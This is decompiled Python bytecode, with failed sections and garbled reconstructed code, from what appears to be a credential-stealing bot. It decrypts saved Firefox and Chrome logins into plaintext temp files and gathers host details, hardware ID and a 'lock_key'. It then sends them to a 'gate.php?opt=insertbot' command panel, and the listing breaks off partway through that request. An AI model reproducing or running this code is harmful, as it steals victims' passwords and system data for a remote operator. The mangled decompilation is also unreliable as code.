              350  POP_TOP          

 L. 506       352  LOAD_GLOBAL              print
              354  LOAD_STR                 'decrypted=%s'
              356  LOAD_GLOBAL              hexlify
              358  LOAD_FAST                'privKey'
              360  CALL_FUNCTION_1       1  ''
              362  BINARY_MODULO    
              364  CALL_FUNCTION_1       1  ''
              366  POP_TOP          
            368_0  COME_FROM           316  '316'

 L. 507       368  LOAD_GLOBAL              printASN1
              370  LOAD_FAST                'privKey'
              372  LOAD_GLOBAL              len
              374  LOAD_FAST                'privKey'
              376  CALL_FUNCTION_1       1  ''
              378  LOAD_CONST               0
              380  CALL_FUNCTION_3       3  ''
              382  POP_TOP          

 L. 518       384  LOAD_GLOBAL              decoder
              386  LOAD_METHOD              decode
              388  LOAD_FAST                'privKey'
              390  CALL_METHOD_1         1  ''
              392  STORE_FAST               'privKeyASN1'

 L. 519       394  LOAD_FAST                'privKeyASN1'
              396  LOAD_CONST               0
              398  BINARY_SUBSCR    
              400  LOAD_CONST               2
              402  BINARY_SUBSCR    
              404  LOAD_METHOD              asOctets
              406  CALL_METHOD_0         0  ''
              408  STORE_FAST               'prKey'

 L. 520       410  LOAD_GLOBAL              print
              412  LOAD_STR                 'decoding %s'
              414  LOAD_GLOBAL              hexlify
              416  LOAD_FAST                'prKey'
              418  CALL_FUNCTION_1       1  ''
              420  BINARY_MODULO    
              422  CALL_FUNCTION_1       1  ''
              424  POP_TOP          

 L. 521       426  LOAD_GLOBAL              printASN1
              428  LOAD_FAST                'prKey'
              430  LOAD_GLOBAL              len
              432  LOAD_FAST                'prKey'
              434  CALL_FUNCTION_1       1  ''
              436  LOAD_CONST               0
              438  CALL_FUNCTION_3       3  ''
              440  POP_TOP          

 L. 535       442  LOAD_GLOBAL              decoder
              444  LOAD_METHOD              decode
              446  LOAD_FAST                'prKey'
              448  CALL_METHOD_1         1  ''
              450  STORE_FAST               'prKeyASN1'

 L. 536       452  LOAD_FAST                'prKeyASN1'
              454  LOAD_CONST               0
              456  BINARY_SUBSCR    
              458  LOAD_CONST               1
              460  BINARY_SUBSCR    
              462  STORE_FAST               'id'

 L. 537       464  LOAD_GLOBAL              long_to_bytes
              466  LOAD_FAST                'prKeyASN1'
              468  LOAD_CONST               0
              470  BINARY_SUBSCR    
              472  LOAD_CONST               3
              474  BINARY_SUBSCR    
              476  CALL_FUNCTION_1       1  ''
              478  STORE_FAST               'key'

 L. 538       480  LOAD_GLOBAL              options
              482  LOAD_ATTR                verbose
              484  LOAD_CONST               0
              486  COMPARE_OP               >
          488_490  POP_JUMP_IF_FALSE   508  'to 508'

 L. 539       492  LOAD_GLOBAL              print
              494  LOAD_STR                 'key=%s'
              496  LOAD_GLOBAL              hexlify
              498  LOAD_FAST                'key'
              500  CALL_FUNCTION_1       1  ''
              502  BINARY_MODULO    
              504  CALL_FUNCTION_1       1  ''
              506  POP_TOP          
            508_0  COME_FROM           488  '488'

 L. 540       508  LOAD_FAST                'key'
              510  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `<118>' instruction at offset 152


def decryptPBE--- This code section failed: ---

 L. 543         0  LOAD_GLOBAL              str
                2  LOAD_FAST                'decodedItem'
                4  LOAD_CONST               0
                6  BINARY_SUBSCR    
                8  LOAD_CONST               0
               10  BINARY_SUBSCR    
               12  LOAD_CONST               0
               14  BINARY_SUBSCR    
               16  CALL_FUNCTION_1       1  ''
               18  STORE_FAST               'pbeAlgo'

 L. 544        20  LOAD_FAST                'pbeAlgo'
               22  LOAD_STR                 '1.2.840.113549.1.12.5.1.3'
               24  COMPARE_OP               ==
               26  POP_JUMP_IF_FALSE   124  'to 124'

 L. 557        28  LOAD_FAST                'decodedItem'
               30  LOAD_CONST               0
               32  BINARY_SUBSCR    
               34  LOAD_CONST               0
               36  BINARY_SUBSCR    
               38  LOAD_CONST               1
               40  BINARY_SUBSCR    
               42  LOAD_CONST               0
               44  BINARY_SUBSCR    
               46  LOAD_METHOD              asOctets
               48  CALL_METHOD_0         0  ''
               50  STORE_FAST               'entrySalt'

 L. 558        52  LOAD_FAST                'decodedItem'
               54  LOAD_CONST               0
               56  BINARY_SUBSCR    
               58  LOAD_CONST               1
               60  BINARY_SUBSCR    
               62  LOAD_METHOD              asOctets
               64  CALL_METHOD_0         0  ''
               66  STORE_FAST               'cipherT'

 L. 559        68  LOAD_GLOBAL              print
               70  LOAD_STR                 'entrySalt:'
               72  LOAD_GLOBAL              hexlify
               74  LOAD_FAST                'entrySalt'
               76  CALL_FUNCTION_1       1  ''
               78  CALL_FUNCTION_2       2  ''
               80  POP_TOP          

 L. 560        82  LOAD_GLOBAL              decryptMoz3DES
               84  LOAD_FAST                'globalSalt'
               86  LOAD_FAST                'masterPassword'
               88  LOAD_FAST                'entrySalt'
               90  LOAD_FAST                'cipherT'
               92  CALL_FUNCTION_4       4  ''
               94  STORE_FAST               'key'

 L. 561        96  LOAD_GLOBAL              print
               98  LOAD_GLOBAL              hexlify
              100  LOAD_FAST                'key'
              102  CALL_FUNCTION_1       1  ''
              104  CALL_FUNCTION_1       1  ''
              106  POP_TOP          

 L. 562       108  LOAD_FAST                'key'
              110  LOAD_CONST               None
              112  LOAD_CONST               24
              114  BUILD_SLICE_2         2 
              116  BINARY_SUBSCR    
              118  LOAD_FAST                'pbeAlgo'
              120  BUILD_TUPLE_2         2 
              122  RETURN_VALUE     
            124_0  COME_FROM            26  '26'

 L. 563       124  LOAD_FAST                'pbeAlgo'
              126  LOAD_STR                 '1.2.840.113549.1.5.13'
              128  COMPARE_OP               ==
          130_132  POP_JUMP_IF_FALSE   486  'to 486'

 L. 590       134  LOAD_GLOBAL              str
              136  LOAD_FAST                'decodedItem'
              138  LOAD_CONST               0
              140  BINARY_SUBSCR    
              142  LOAD_CONST               0
              144  BINARY_SUBSCR    
              146  LOAD_CONST               1
              148  BINARY_SUBSCR    
              150  LOAD_CONST               0
              152  BINARY_SUBSCR    
              154  LOAD_CONST               0
              156  BINARY_SUBSCR    
              158  CALL_FUNCTION_1       1  ''
              160  LOAD_STR                 '1.2.840.113549.1.5.12'
              162  COMPARE_OP               ==
              164  POP_JUMP_IF_TRUE    170  'to 170'
              166  <74>             
              168  RAISE_VARARGS_1       1  'exception instance'
            170_0  COME_FROM           164  '164'

 L. 591       170  LOAD_GLOBAL              str
              172  LOAD_FAST                'decodedItem'
              174  LOAD_CONST               0
              176  BINARY_SUBSCR    
              178  LOAD_CONST               0
              180  BINARY_SUBSCR    
              182  LOAD_CONST               1
              184  BINARY_SUBSCR    
              186  LOAD_CONST               0
              188  BINARY_SUBSCR    
              190  LOAD_CONST               1
              192  BINARY_SUBSCR    
              194  LOAD_CONST               3
              196  BINARY_SUBSCR    
              198  LOAD_CONST               0
              200  BINARY_SUBSCR    
              202  CALL_FUNCTION_1       1  ''
              204  LOAD_STR                 '1.2.840.113549.2.9'
              206  COMPARE_OP               ==
              208  POP_JUMP_IF_TRUE    214  'to 214'
              210  <74>             
              212  RAISE_VARARGS_1       1  'exception instance'
            214_0  COME_FROM           208  '208'

 L. 592       214  LOAD_GLOBAL              str
              216  LOAD_FAST                'decodedItem'
              218  LOAD_CONST               0
              220  BINARY_SUBSCR    
              222  LOAD_CONST               0
              224  BINARY_SUBSCR    
              226  LOAD_CONST               1
              228  BINARY_SUBSCR    
              230  LOAD_CONST               1
              232  BINARY_SUBSCR    
              234  LOAD_CONST               0
              236  BINARY_SUBSCR    
              238  CALL_FUNCTION_1       1  ''
              240  LOAD_STR                 '2.16.840.1.101.3.4.1.42'
              242  COMPARE_OP               ==
              244  POP_JUMP_IF_TRUE    250  'to 250'
              246  <74>             
              248  RAISE_VARARGS_1       1  'exception instance'
            250_0  COME_FROM           244  '244'

 L. 594       250  LOAD_FAST                'decodedItem'
              252  LOAD_CONST               0
              254  BINARY_SUBSCR    
              256  LOAD_CONST               0
              258  BINARY_SUBSCR    
              260  LOAD_CONST               1
              262  BINARY_SUBSCR    
              264  LOAD_CONST               0
              266  BINARY_SUBSCR    
              268  LOAD_CONST               1
              270  BINARY_SUBSCR    
              272  LOAD_CONST               0
              274  BINARY_SUBSCR    
              276  LOAD_METHOD              asOctets
              278  CALL_METHOD_0         0  ''
              280  STORE_FAST               'entrySalt'

 L. 595       282  LOAD_GLOBAL              int
              284  LOAD_FAST                'decodedItem'
              286  LOAD_CONST               0
              288  BINARY_SUBSCR    
              290  LOAD_CONST               0
              292  BINARY_SUBSCR    
              294  LOAD_CONST               1
              296  BINARY_SUBSCR    
              298  LOAD_CONST               0
              300  BINARY_SUBSCR    
              302  LOAD_CONST               1
              304  BINARY_SUBSCR    
              306  LOAD_CONST               1
              308  BINARY_SUBSCR    
              310  CALL_FUNCTION_1       1  ''
              312  STORE_FAST               'iterationCount'

 L. 596       314  LOAD_GLOBAL              int
              316  LOAD_FAST                'decodedItem'
              318  LOAD_CONST               0
              320  BINARY_SUBSCR    
              322  LOAD_CONST               0
              324  BINARY_SUBSCR    
              326  LOAD_CONST               1
              328  BINARY_SUBSCR    
              330  LOAD_CONST               0
              332  BINARY_SUBSCR    
              334  LOAD_CONST               1
              336  BINARY_SUBSCR    
              338  LOAD_CONST               2
              340  BINARY_SUBSCR    
              342  CALL_FUNCTION_1       1  ''
              344  STORE_FAST               'keyLength'

 L. 597       346  LOAD_FAST                'keyLength'
              348  LOAD_CONST               32
              350  COMPARE_OP               ==
          352_354  POP_JUMP_IF_TRUE    360  'to 360'
              356  <74>             
              358  RAISE_VARARGS_1       1  'exception instance'
            360_0  COME_FROM           352  '352'

 L. 599       360  LOAD_GLOBAL              sha1
              362  LOAD_FAST                'globalSalt'
              364  LOAD_FAST                'masterPassword'
              366  BINARY_ADD       
              368  CALL_FUNCTION_1       1  ''
              370  LOAD_METHOD              digest
              372  CALL_METHOD_0         0  ''
              374  STORE_FAST               'k'

 L. 600       376  LOAD_GLOBAL              pbkdf2_hmac
              378  LOAD_STR                 'sha256'
              380  LOAD_FAST                'k'
              382  LOAD_FAST                'entrySalt'
              384  LOAD_FAST                'iterationCount'
              386  LOAD_FAST                'keyLength'
              388  LOAD_CONST               ('dklen',)
              390  CALL_FUNCTION_KW_5     5  '5 total positional and keyword args'
              392  STORE_FAST               'key'

 L. 602       394  LOAD_CONST               b'\x04\x0e'
              396  LOAD_FAST                'decodedItem'
              398  LOAD_CONST               0
              400  BINARY_SUBSCR    
              402  LOAD_CONST               0
              404  BINARY_SUBSCR    
              406  LOAD_CONST               1
              408  BINARY_SUBSCR    
              410  LOAD_CONST               1
              412  BINARY_SUBSCR    
              414  LOAD_CONST               1
              416  BINARY_SUBSCR    
              418  LOAD_METHOD              asOctets
              420  CALL_METHOD_0         0  ''
              422  BINARY_ADD       
              424  STORE_FAST               'iv'

 L. 604       426  LOAD_FAST                'decodedItem'
              428  LOAD_CONST               0
              430  BINARY_SUBSCR    
              432  LOAD_CONST               1
              434  BINARY_SUBSCR    
              436  LOAD_METHOD              asOctets
              438  CALL_METHOD_0         0  ''
              440  STORE_FAST               'cipherT'

 L. 605       442  LOAD_GLOBAL              AES
              444  LOAD_METHOD              new
              446  LOAD_FAST                'key'
              448  LOAD_GLOBAL              AES
              450  LOAD_ATTR                MODE_CBC
              452  LOAD_FAST                'iv'
              454  CALL_METHOD_3         3  ''
              456  LOAD_METHOD              decrypt
              458  LOAD_FAST                'cipherT'
              460  CALL_METHOD_1         1  ''
              462  STORE_FAST               'clearText'

 L. 607       464  LOAD_GLOBAL              print
              466  LOAD_STR                 'clearText'
              468  LOAD_GLOBAL              hexlify
              470  LOAD_FAST                'clearText'
              472  CALL_FUNCTION_1       1  ''
              474  CALL_FUNCTION_2       2  ''
              476  POP_TOP          

 L. 608       478  LOAD_FAST                'clearText'
              480  LOAD_FAST                'pbeAlgo'
              482  BUILD_TUPLE_2         2 
              484  RETURN_VALUE     
            486_0  COME_FROM           130  '130'

Parse error at or near `<74>' instruction at offset 166


def getKey(masterPassword, directory):
    if (directory / 'key4.db').exists():
        conn = sqlite3.connect(directory / 'key4.db')
        c = conn.cursor()
        c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
        row = c.fetchone()
        globalSalt = row[0]
        print'globalSalt:'hexlify(globalSalt)
        item2 = row[1]
        printASN1item2len(item2)0
        decodedItem2 = decoder.decode(item2)
        clearText, algo = decryptPBEdecodedItem2masterPasswordglobalSalt
        print'password check?'(clearText == b'password-check\x02\x02')
        if clearText == b'password-check\x02\x02':
            c.execute('SELECT a11,a102 FROM nssPrivate;')
            for row in c:
                if row[0] != None:
                    break
            else:
                a11 = row[0]
                a102 = row[1]
                if a102 == CKA_ID:
                    printASN1a11len(a11)0
                    decoded_a11 = decoder.decode(a11)
                    clearText, algo = decryptPBEdecoded_a11masterPasswordglobalSalt
                    return (
                     clearText[:24], algo)
                print('no saved login/password')

        return (None, None)
    if (directory / 'key3.db').exists():
        keyData = readBsddb(directory + 'key3.db')
        key = extractSecretKeymasterPasswordkeyData
        return (
         key, '1.2.840.113549.1.12.5.1.3')
    print('cannot find key4.db or key3.db')
    return (None, None)


def Firefox--- This code section failed: ---

 L. 650         0  LOAD_GLOBAL              OptionParser
                2  LOAD_STR                 'usage: %prog [options]'
                4  LOAD_CONST               ('usage',)
                6  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
                8  STORE_FAST               'parser'

 L. 651        10  LOAD_FAST                'parser'
               12  LOAD_ATTR                add_option
               14  LOAD_STR                 '-p'
               16  LOAD_STR                 '--password'
               18  LOAD_STR                 'string'
               20  LOAD_STR                 'masterPassword'
               22  LOAD_STR                 'masterPassword'
               24  LOAD_STR                 ''
               26  LOAD_CONST               ('type', 'dest', 'help', 'default')
               28  CALL_FUNCTION_KW_6     6  '6 total positional and keyword args'
               30  POP_TOP          

 L. 652        32  LOAD_FAST                'parser'
               34  LOAD_METHOD              parse_args
               36  CALL_METHOD_0         0  ''
               38  UNPACK_SEQUENCE_2     2 
               40  STORE_FAST               'options'
               42  STORE_FAST               'args'

 L. 653        44  LOAD_GLOBAL              Path
               46  LOAD_GLOBAL              profile_path
               48  CALL_FUNCTION_0       0  ''
               50  CALL_FUNCTION_1       1  ''
               52  STORE_FAST               'profile_directory'

 L. 654        54  LOAD_GLOBAL              getKey
               56  LOAD_FAST                'options'
               58  LOAD_ATTR                masterPassword
               60  LOAD_METHOD              encode
               62  CALL_METHOD_0         0  ''
               64  LOAD_FAST                'profile_directory'
               66  CALL_FUNCTION_2       2  ''
               68  UNPACK_SEQUENCE_2     2 
               70  STORE_FAST               'key'
               72  STORE_FAST               'algo'

 L. 655        74  LOAD_FAST                'key'
               76  LOAD_CONST               None
               78  COMPARE_OP               ==
               80  POP_JUMP_IF_FALSE    90  'to 90'

 L. 656        82  LOAD_GLOBAL              print
               84  LOAD_STR                 'none'
               86  CALL_FUNCTION_1       1  ''
               88  POP_TOP          
             90_0  COME_FROM            80  '80'

 L. 657        90  LOAD_GLOBAL              getLoginData
               92  CALL_FUNCTION_0       0  ''
               94  STORE_FAST               'logins'

 L. 658        96  LOAD_GLOBAL              len
               98  LOAD_FAST                'logins'
              100  CALL_FUNCTION_1       1  ''
              102  LOAD_CONST               0
              104  COMPARE_OP               ==
              106  POP_JUMP_IF_FALSE   118  'to 118'

 L. 659       108  LOAD_GLOBAL              print
              110  LOAD_STR                 'login'
              112  CALL_FUNCTION_1       1  ''
              114  POP_TOP          
              116  JUMP_FORWARD        352  'to 352'
            118_0  COME_FROM           106  '106'

 L. 661       118  LOAD_FAST                'algo'
              120  LOAD_STR                 '1.2.840.113549.1.12.5.1.3'
              122  COMPARE_OP               ==
              124  POP_JUMP_IF_TRUE    136  'to 136'
              126  LOAD_FAST                'algo'
              128  LOAD_STR                 '1.2.840.113549.1.5.13'
              130  COMPARE_OP               ==
          132_134  POP_JUMP_IF_FALSE   352  'to 352'
            136_0  COME_FROM           124  '124'

 L. 662       136  LOAD_FAST                'logins'
              138  GET_ITER         
            140_0  COME_FROM           350  '350'
              140  FOR_ITER            352  'to 352'
              142  STORE_FAST               'i'

 L. 663       144  LOAD_GLOBAL              os
              146  LOAD_ATTR                environ
              148  LOAD_STR                 'TEMP'
              150  BINARY_SUBSCR    
              152  LOAD_GLOBAL              os
              154  LOAD_ATTR                sep
              156  BINARY_ADD       
              158  LOAD_STR                 '\\ff.tmp'
              160  BINARY_ADD       
              162  STORE_FAST               'save_path'

 L. 664       164  LOAD_FAST                'i'
              166  LOAD_CONST               0
              168  BINARY_SUBSCR    
              170  LOAD_CONST               0
              172  BINARY_SUBSCR    
              174  LOAD_GLOBAL              CKA_ID
              176  COMPARE_OP               ==
              178  POP_JUMP_IF_TRUE    184  'to 184'
              180  <74>             
              182  RAISE_VARARGS_1       1  'exception instance'
            184_0  COME_FROM           178  '178'

 L. 665       184  LOAD_STR                 'URL:'
              186  LOAD_STR                 '%20s:'
              188  LOAD_FAST                'i'
              190  LOAD_CONST               2
              192  BINARY_SUBSCR    
              194  BINARY_MODULO    
              196  BINARY_ADD       
              198  LOAD_STR                 '\n'
              200  BINARY_ADD       
              202  STORE_FAST               'login_data'

 L. 666       204  LOAD_FAST                'i'
              206  LOAD_CONST               0
              208  BINARY_SUBSCR    
              210  LOAD_CONST               1
              212  BINARY_SUBSCR    
              214  STORE_FAST               'iv'

 L. 667       216  LOAD_FAST                'i'
              218  LOAD_CONST               0
              220  BINARY_SUBSCR    
              222  LOAD_CONST               2
              224  BINARY_SUBSCR    
              226  STORE_FAST               'ciphertext'

 L. 668       228  LOAD_FAST                'login_data'
              230  LOAD_STR                 'User:'
              232  BINARY_ADD       
              234  LOAD_GLOBAL              str
              236  LOAD_GLOBAL              unpad
              238  LOAD_GLOBAL              DES3
              240  LOAD_METHOD              new
              242  LOAD_FAST                'key'
              244  LOAD_GLOBAL              DES3
              246  LOAD_ATTR                MODE_CBC
              248  LOAD_FAST                'iv'
              250  CALL_METHOD_3         3  ''
              252  LOAD_METHOD              decrypt
              254  LOAD_FAST                'ciphertext'
              256  CALL_METHOD_1         1  ''
              258  LOAD_CONST               8
              260  CALL_FUNCTION_2       2  ''
              262  CALL_FUNCTION_1       1  ''
              264  BINARY_ADD       
              266  LOAD_STR                 '\n'
              268  BINARY_ADD       
              270  STORE_FAST               'login_data'

 L. 669       272  LOAD_FAST                'i'
              274  LOAD_CONST               1
              276  BINARY_SUBSCR    
              278  LOAD_CONST               1
              280  BINARY_SUBSCR    
              282  STORE_FAST               'iv'

 L. 670       284  LOAD_FAST                'i'
              286  LOAD_CONST               1
              288  BINARY_SUBSCR    
              290  LOAD_CONST               2
              292  BINARY_SUBSCR    
              294  STORE_FAST               'ciphertext'

 L. 671       296  LOAD_FAST                'login_data'
              298  LOAD_STR                 'Password:'
              300  BINARY_ADD       
              302  LOAD_GLOBAL              str
              304  LOAD_GLOBAL              unpad
              306  LOAD_GLOBAL              DES3
              308  LOAD_METHOD              new
              310  LOAD_FAST                'key'
              312  LOAD_GLOBAL              DES3
              314  LOAD_ATTR                MODE_CBC
              316  LOAD_FAST                'iv'
              318  CALL_METHOD_3         3  ''
              320  LOAD_METHOD              decrypt
              322  LOAD_FAST                'ciphertext'
              324  CALL_METHOD_1         1  ''
              326  LOAD_CONST               8
              328  CALL_FUNCTION_2       2  ''
              330  CALL_FUNCTION_1       1  ''
              332  BINARY_ADD       
              334  LOAD_STR                 '\n'
              336  BINARY_ADD       
              338  STORE_FAST               'login_data'

 L. 672       340  LOAD_GLOBAL              output
              342  LOAD_FAST                'save_path'
              344  LOAD_FAST                'login_data'
              346  CALL_FUNCTION_2       2  ''
              348  POP_TOP          
              350  JUMP_BACK           140  'to 140'
            352_0  COME_FROM           140  '140'
            352_1  COME_FROM           132  '132'
            352_2  COME_FROM           116  '116'

Parse error at or near `<74>' instruction at offset 180


def output(path, data):
    f = openpath'a+'
    f.write(data + ' \r\n')
    f.close()


def Chrome--- This code section failed: ---

 L. 681         0  LOAD_GLOBAL              get_master_key
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'master_key'

 L. 682         6  LOAD_GLOBAL              os
                8  LOAD_ATTR                environ
               10  LOAD_STR                 'USERPROFILE'
               12  BINARY_SUBSCR    
               14  LOAD_GLOBAL              os
               16  LOAD_ATTR                sep
               18  BINARY_ADD       
               20  LOAD_STR                 'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
               22  BINARY_ADD       
               24  STORE_FAST               'login_db'

 L. 683        26  LOAD_GLOBAL              os
               28  LOAD_ATTR                environ
               30  LOAD_STR                 'TEMP'
               32  BINARY_SUBSCR    
               34  LOAD_GLOBAL              os
               36  LOAD_ATTR                sep
               38  BINARY_ADD       
               40  LOAD_STR                 '\\ch.tmp'
               42  BINARY_ADD       
               44  STORE_FAST               'save_path'

 L. 684        46  LOAD_GLOBAL              os
               48  LOAD_ATTR                path
               50  LOAD_METHOD              isfile
               52  LOAD_FAST                'login_db'
               54  CALL_METHOD_1         1  ''
            56_58  POP_JUMP_IF_FALSE   308  'to 308'

 L. 686        60  LOAD_GLOBAL              shutil
               62  LOAD_METHOD              copy2
               64  LOAD_FAST                'login_db'
               66  LOAD_STR                 'Loginvault.db'
               68  CALL_METHOD_2         2  ''
               70  POP_TOP          

 L. 687        72  LOAD_GLOBAL              sqlite3
               74  LOAD_METHOD              connect
               76  LOAD_STR                 'Loginvault.db'
               78  CALL_METHOD_1         1  ''
               80  STORE_FAST               'conn'

 L. 688        82  LOAD_FAST                'conn'
               84  LOAD_METHOD              cursor
               86  CALL_METHOD_0         0  ''
               88  STORE_FAST               'cursor'

 L. 690        90  SETUP_FINALLY       200  'to 200'

 L. 691        92  LOAD_FAST                'cursor'
               94  LOAD_METHOD              execute
               96  LOAD_STR                 'SELECT action_url, username_value, password_value FROM logins'
               98  CALL_METHOD_1         1  ''
              100  POP_TOP          

 L. 692       102  LOAD_FAST                'cursor'
              104  LOAD_METHOD              fetchall
              106  CALL_METHOD_0         0  ''
              108  GET_ITER         
            110_0  COME_FROM           194  '194'
              110  FOR_ITER            196  'to 196'
              112  STORE_FAST               'r'

 L. 693       114  LOAD_FAST                'r'
              116  LOAD_CONST               0
              118  BINARY_SUBSCR    
              120  STORE_FAST               'url'

 L. 694       122  LOAD_FAST                'r'
              124  LOAD_CONST               1
              126  BINARY_SUBSCR    
              128  STORE_FAST               'username'

 L. 695       130  LOAD_FAST                'r'
              132  LOAD_CONST               2
              134  BINARY_SUBSCR    
              136  STORE_FAST               'encrypted_password'

 L. 696       138  LOAD_GLOBAL              decrypt_password
              140  LOAD_FAST                'encrypted_password'
              142  LOAD_FAST                'master_key'
              144  CALL_FUNCTION_2       2  ''
              146  STORE_FAST               'decrypted_password'

 L. 697       148  LOAD_STR                 'URL: '
              150  LOAD_FAST                'url'
              152  BINARY_ADD       
              154  LOAD_STR                 '\nUser Name: '
              156  BINARY_ADD       
              158  LOAD_FAST                'username'
              160  BINARY_ADD       
              162  LOAD_STR                 '\nPassword: '
              164  BINARY_ADD       
              166  LOAD_FAST                'decrypted_password'
              168  BINARY_ADD       
              170  LOAD_STR                 '\n'
              172  BINARY_ADD       
              174  LOAD_STR                 '**************************************************'
              176  BINARY_ADD       
              178  LOAD_STR                 '\n'
              180  BINARY_ADD       
              182  STORE_FAST               'dump_data'

 L. 699       184  LOAD_GLOBAL              output
              186  LOAD_FAST                'save_path'
              188  LOAD_FAST                'dump_data'
              190  CALL_FUNCTION_2       2  ''
              192  POP_TOP          
              194  JUMP_BACK           110  'to 110'
            196_0  COME_FROM           110  '110'
              196  POP_BLOCK        
              198  JUMP_FORWARD        236  'to 236'
            200_0  COME_FROM_FINALLY    90  '90'

 L. 701       200  DUP_TOP          
              202  LOAD_GLOBAL              Exception
              204  <121>               234  ''
              206  POP_TOP          
              208  STORE_FAST               'e'
              210  POP_TOP          
              212  SETUP_FINALLY       226  'to 226'

 L. 702       214  POP_BLOCK        
              216  POP_EXCEPT       
              218  LOAD_CONST               None
              220  STORE_FAST               'e'
              222  DELETE_FAST              'e'
              224  JUMP_FORWARD        236  'to 236'
            226_0  COME_FROM_FINALLY   212  '212'
              226  LOAD_CONST               None
              228  STORE_FAST               'e'
              230  DELETE_FAST              'e'
              232  <48>             
              234  <48>             
            236_0  COME_FROM           224  '224'
            236_1  COME_FROM           198  '198'

 L. 704       236  LOAD_FAST                'cursor'
              238  LOAD_METHOD              close
              240  CALL_METHOD_0         0  ''
              242  POP_TOP          

 L. 705       244  LOAD_FAST                'conn'
              246  LOAD_METHOD              close
              248  CALL_METHOD_0         0  ''
              250  POP_TOP          

 L. 706       252  SETUP_FINALLY       268  'to 268'

 L. 707       254  LOAD_GLOBAL              os
              256  LOAD_METHOD              remove
              258  LOAD_STR                 'Loginvault.db'
              260  CALL_METHOD_1         1  ''
              262  POP_TOP          
              264  POP_BLOCK        
              266  JUMP_FORWARD        306  'to 306'
            268_0  COME_FROM_FINALLY   252  '252'

 L. 708       268  DUP_TOP          
              270  LOAD_GLOBAL              Exception
          272_274  <121>               304  ''
              276  POP_TOP          
              278  STORE_FAST               'e'
              280  POP_TOP          
              282  SETUP_FINALLY       296  'to 296'

 L. 709       284  POP_BLOCK        
              286  POP_EXCEPT       
              288  LOAD_CONST               None
              290  STORE_FAST               'e'
              292  DELETE_FAST              'e'
              294  JUMP_FORWARD        306  'to 306'
            296_0  COME_FROM_FINALLY   282  '282'
              296  LOAD_CONST               None
              298  STORE_FAST               'e'
              300  DELETE_FAST              'e'
              302  <48>             
              304  <48>             
            306_0  COME_FROM           294  '294'
            306_1  COME_FROM           266  '266'
              306  JUMP_FORWARD        308  'to 308'
            308_0  COME_FROM           306  '306'
            308_1  COME_FROM            56  '56'

Parse error at or near `<121>' instruction at offset 204


def get_registry_value(key, subkey, value):
    key = getattrwinregkey
    handle = winreg.OpenKeykeysubkey
    value, type = winreg.QueryValueExhandlevalue
    return value


def Base64Encode--- This code section failed: ---

 L. 720         0  LOAD_GLOBAL              open
                2  LOAD_FAST                'file'
                4  LOAD_STR                 'rb'
                6  CALL_FUNCTION_2       2  ''
                8  SETUP_WITH           58  'to 58'
               10  STORE_FAST               'binary_file'

 L. 721        12  LOAD_FAST                'binary_file'
               14  LOAD_METHOD              read
               16  CALL_METHOD_0         0  ''
               18  STORE_FAST               'binary_file_data'

 L. 722        20  LOAD_GLOBAL              base64
               22  LOAD_METHOD              b64encode
               24  LOAD_FAST                'binary_file_data'
               26  CALL_METHOD_1         1  ''
               28  STORE_FAST               'base64_encoded_data'

 L. 723        30  LOAD_FAST                'base64_encoded_data'
               32  LOAD_METHOD              decode
               34  LOAD_STR                 'utf-8'
               36  CALL_METHOD_1         1  ''
               38  STORE_FAST               'base64_message'

 L. 724        40  LOAD_FAST                'base64_message'
               42  POP_BLOCK        
               44  ROT_TWO          
               46  LOAD_CONST               None
               48  DUP_TOP          
               50  DUP_TOP          
               52  CALL_FUNCTION_3       3  ''
               54  POP_TOP          
               56  RETURN_VALUE     
             58_0  COME_FROM_WITH        8  '8'
               58  <49>             
               60  POP_JUMP_IF_TRUE     64  'to 64'
               62  <48>             
             64_0  COME_FROM            60  '60'
               64  POP_TOP          
               66  POP_TOP          
               68  POP_TOP          
               70  POP_EXCEPT       
               72  POP_TOP          

Parse error at or near `LOAD_CONST' instruction at offset 46


def Connect2Panel--- This code section failed: ---

 L. 727         0  LOAD_GLOBAL              url
                2  LOAD_STR                 'gate.php?opt=insertbot'
                4  BINARY_ADD       
                6  STORE_FAST               'gateUrl'

 L. 728         8  LOAD_GLOBAL              os
               10  LOAD_ATTR                environ
               12  LOAD_STR                 'USERNAME'
               14  BINARY_SUBSCR    
               16  LOAD_STR                 '/'
               18  BINARY_ADD       
               20  LOAD_GLOBAL              os
               22  LOAD_ATTR                environ
               24  LOAD_STR                 'COMPUTERNAME'
               26  BINARY_SUBSCR    
               28  BINARY_ADD       
               30  STORE_FAST               'pcName'

 L. 729        32  LOAD_GLOBAL              get_registry_value

 L. 730        34  LOAD_STR                 'HKEY_LOCAL_MACHINE'

 L. 731        36  LOAD_STR                 'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment'

 L. 732        38  LOAD_STR                 'PROCESSOR_ARCHITECTURE'

 L. 729        40  CALL_FUNCTION_3       3  ''
               42  STORE_FAST               'windowsbit'

 L. 733        44  LOAD_GLOBAL              get_registry_value

 L. 734        46  LOAD_STR                 'HKEY_LOCAL_MACHINE'

 L. 735        48  LOAD_STR                 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'

 L. 736        50  LOAD_STR                 'ProductName'

 L. 733        52  CALL_FUNCTION_3       3  ''
               54  STORE_FAST               'windowsver'

 L. 737        56  LOAD_FAST                'windowsver'
               58  LOAD_STR                 '('
               60  BINARY_ADD       
               62  LOAD_FAST                'windowsbit'
               64  BINARY_ADD       
               66  LOAD_STR                 ')'
               68  BINARY_ADD       
               70  STORE_FAST               'winVer'

 L. 738        72  LOAD_GLOBAL              hwid
               74  LOAD_FAST                'winVer'
               76  LOAD_FAST                'pcName'
               78  LOAD_GLOBAL              ReadKey
               80  CALL_FUNCTION_0       0  ''
               82  LOAD_CONST               ('hwid', 'os', 'pcname', 'lock_key')
               84  BUILD_CONST_KEY_MAP_4     4 
               86  STORE_FAST               'data'

 L. 739        88  SETUP_FINALLY       130  'to 130'

 L. 740        90  LOAD_GLOBAL              requests
               92  LOAD_ATTR                get
               94  LOAD_FAST                'gateUrl'
               96  LOAD_CONST               3
               98  LOAD_CONST               ('timeout',)
              100  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              102  STORE_FAST               'r'

 L. 741       104  LOAD_GLOBAL              requests
              106  LOAD_ATTR                post
              108  LOAD_FAST                'gateUrl'
              110  LOAD_FAST                'data'
              112  LOAD_CONST               ('data',)
